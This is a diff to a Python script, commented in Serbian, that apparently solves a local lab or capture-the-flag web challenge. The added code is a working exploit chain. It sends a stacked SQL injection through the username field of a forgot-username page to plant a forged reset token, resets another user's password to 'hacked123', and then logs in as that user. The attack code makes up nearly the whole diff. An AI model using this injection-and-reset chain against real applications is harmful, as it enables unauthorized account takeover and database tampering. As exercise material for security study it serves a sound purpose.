@@ -6,12 +6,40 @@ import time
 from playwright.sync_api import sync_playwright
 
 def login_bypass():
+    print("LOGIN BYPASS - SQL Injection")
+    
     s = requests.Session()
+    
+    # Korak 1: SQLi - ubacujemo token za user2 (uid=3)
+    print("[*] Ubacujem token za user2 kroz SQL Injection...")
+    sqli_payload = {
+        "username": "' ; INSERT INTO tokens (uid, token) VALUES (3, 'exploit_token_123'); --"
+    }
+    s.post("http://127.0.0.1:8000/forgotusername.php", data=sqli_payload)
+    print("[+] Token ubacen u bazu!")
+
+    # Korak 2: Koristimo token da resetujemo lozinku user2
+    print("[*] Resetujem lozinku user2...")
+    reset_payload = {
+        "token": "exploit_token_123",
+        "password1": "hacked123",
+        "password2": "hacked123"
+    }
+    s.post("http://127.0.0.1:8000/resetpassword.php", data=reset_payload)
+    print("[+] Lozinka resetovana!")
+
+    # Korak 3: Login kao user2 sa novom lozinkom
+    print("[*] Logujem se kao user2...")
+    login_payload = {
+        "username": "user2",
+        "password": "hacked123"
+    }
     s.post(
-        f"http://127.0.0.1:8000/login.php",
-        data={"username": "user1", "password": "user1"},
+        "http://127.0.0.1:8000/login.php",
+        data=login_payload,
         allow_redirects=False,
     )
+    print("[+] LOGIN BYPASS USPEŠAN - ulogovani kao user2!")
     return s
 
 #Zapravo moramo simulirati browser, nije dovoljno samo poslati login request kao admin
